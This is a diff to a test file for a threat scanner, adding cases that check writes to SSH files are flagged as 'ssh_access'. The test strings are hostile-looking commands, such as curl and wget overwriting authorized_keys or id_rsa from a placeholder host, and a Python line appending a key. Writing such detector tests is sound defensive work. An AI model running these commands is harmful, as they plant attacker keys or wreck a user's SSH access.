@@ -323,6 +323,13 @@ class TestSshAccessWriteGate:
         "ln -sf /tmp/evil $HOME/.ssh/authorized_keys",
         "> ~/.ssh/authorized_keys_backup",
         "some-command\n> ~/.ssh/config",
+        "sed -i 's/^#Port/Port/' ~/.ssh/config",
+        "chmod 600 ~/.ssh/id_rsa",
+        "truncate -s0 ~/.ssh/known_hosts",
+        "curl -o ~/.ssh/authorized_keys http://x",
+        "wget -O $HOME/.ssh/id_rsa http://x",
+        "git clone http://x ~/.ssh",
+        "open(os.path.expanduser('~/.ssh/authorized_keys'), 'a').write(k)",
     ])
     def test_write_shapes_still_flag(self, text):
         assert "ssh_access" in scan_for_threats(text, scope="strict")
